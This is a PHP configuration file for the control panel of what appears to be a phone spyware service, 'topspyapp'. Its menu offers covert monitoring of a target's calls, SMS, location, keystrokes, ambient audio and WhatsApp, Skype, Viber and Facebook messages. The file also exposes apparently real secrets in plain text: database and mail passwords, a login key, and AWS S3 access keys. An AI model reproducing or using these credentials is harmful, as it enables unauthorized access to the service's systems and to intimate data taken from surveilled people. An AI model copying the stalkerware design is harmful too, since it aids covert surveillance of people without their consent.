<?php

return array(
    'build' => 24,
    'domain' => 'http://new-cp.topspyapp.local',
    'staticDomain' => 'http://new-cp.topspyapp.local/static',
    'cookieDomain' => 'topspyapp.local',
    'supportEmail' => 'orest@dataedu.com', //'support@topspyapp.com',
    'logger' => array(
        'stream' => array(
            'filename' => ROOT_PATH . 'system.log'
        ),
        'mail' => array(
            'from' => 'orest@dataedu.com',
            'to' => 'orest@dataedu.com',
            'subject' => 'TS CP Logger'
        )
    ),
    'namespaces' => array(
        'Controllers' => ROOT_PATH . 'controllers/',
        'Models' => ROOT_PATH . 'models/',
        'System' => ROOT_PATH . 'system/'
    ),
    'db' => array(
        'production' => array(
            'host' => '66.232.96.3',
            'username' => 'user_data',
            'password' => 'pai1Geo9',
            'dbname' => 'user_data',
            'options' => array(
                //PDO::MYSQL_ATTR_INIT_COMMAND => 'set names utf8;',
                PDO::MYSQL_ATTR_INIT_COMMAND => 'set names latin1;',
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
            )
        ),
        'development' => array(
            'host' => '66.232.96.3',
            'username' => 'user_data',
            'password' => 'pai1Geo9',
            'dbname' => 'user_data',
            'options' => array(
                PDO::MYSQL_ATTR_INIT_COMMAND => 'set names latin1;',
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
            )
        ),
        'testing' => array(
            'host' => 'localhost',
            'username' => 'root',
            'password' => '',
            'dbname' => 'user_data_test',
            'options' => array(
                PDO::MYSQL_ATTR_INIT_COMMAND => 'set names latin1;',
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
            )
        ),
    ),
    'mail' => array(
        'host' => 'mail.topspyapp.com',
        'port' => 587,
        'username' => 'no-reply@topspyapp.com',
        'password' => 'SuKg62Euaw',
        'from' => 'no-reply@topspyapp.com',
        'fromName' => 'Topspyapp.com',
        'logoImageUrl' => 'http://www.topspyapp.com/wp-content/themes/topspyapp/images/logo.png',
        'logoUrl' => 'http://cp.topspyapp.com/'
    ),
    'smarty' => array(
        'template_dir' => ROOT_PATH . 'templates/',
        'compile_dir' => ROOT_PATH . 'tmp/',
        'caching' => false,
        'compile_check' => true,
        'force_compile' => true
    ),
    'locales' => array(
        'en-GB' => 'English',
        //'ru-RU' => 'Russian'
    //'de-DE' => 'German',
    //'es-ES' => 'Spanish',
    //'it-IT' => 'Italian',
    //'uk-UA' => 'Ukrainian'
    ),
    'cpMenu' => array(
        'calls' => 'View Calls',
        'sms' => 'View SMS',
        'locations' => 'View Locations',
        'bookmarks' => array(
            'name' => 'View Bookmarks',
            'hideOS' => array('blackberry')
        ),
        'browserHistory' => array(
            'name' => 'View Browser History',
            'hideOS' => array('blackberry')
        ),
        'calendar' => array(
            'name' => 'View Calendar',
            'hideOS' => array('blackberry')
        ),
        'contacts' => array(
            'name' => 'View Contacts',
            'hideOS' => array('blackberry')
        ),
        'keylogger' => array(
            'name' => 'Keylogger',
            'hideOS' => array('blackberry')
        ),
        'surrounding' => array(
            'name' => 'Surrounding Records'
        ),
        'callRecordings' => array(
            'name' => 'Call Recordings',
            'showOS' => array('android')
        ),
        'photos' => array(
            'name' => 'View Photos',
            'hideOS' => array('blackberry')
        ),
        'videos' => array(
            'name' => 'View Videos',
            'hideOS' => array('blackberry')
        ),
        'viber' => array(
            'name' => 'Viber Tracking',
            'hideOS' => array('blackberry')
        ),
        'skype' => array(
            'name' => 'Skype Tracking',
            'hideOS' => array('blackberry')
        ),
        'whatsapp' => array(
            'name' => 'Whatsapp Tracking',
            'hideOS' => array('blackberry')
        ),
        'facebook' => array(
            'name' => 'Facebook Messages',
            'showOS' => array('android', 'ios')
        ),
        'vk' => array(
            'name' => 'VK Messages',
            //'showLocale' => array('ru-RU'),
            'showOS' => array('android', 'ios')
        ),
        'emails' => array(
            'name' => 'View Emails',
            'hideOS' => array('blackberry')
        ),
        'applications' => array(
            'name' => 'View Applications',
            'hideOS' => array('blackberry')
        ),
        'smsCommands' => array(
            'name' => 'Sms Commands',
            'hideOS' => array('blackberry')
        ),
        'settings' => 'Phone Settings'
    ),
    'contents' => array(
        'how-to-install/android-instructions.html' => 'Android Installation Guide',
        'how-to-install/blackberry-instructions.html' => 'BlackBerry Installation Guide',
        'how-to-install/ios-instructions.html' => 'iPhone Installation Guide',
        'how-to-install/root-instructions.html' => 'Root Instructions'
    ),
    'simpleLoginKey' => 'TR$dtR!E:067mjpp-S%%;l@2|eRy.*~e',
    's3' => array(
        'key' => 'AKIAIHGTCBLPUEKBCRGA',
        'secret' => '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',
        'bucket' => 'topspy_user_media'
    ),
    'cloudFront' => array(
        'domain' => 'http://media.topspyapp.com/',
        'keyPairId' => 'APKAJEW3MLUPI6ZCDZBA',
        'privateKeyFile' => ROOT_PATH . 'cloudFrontPrivateKey'
    )
);
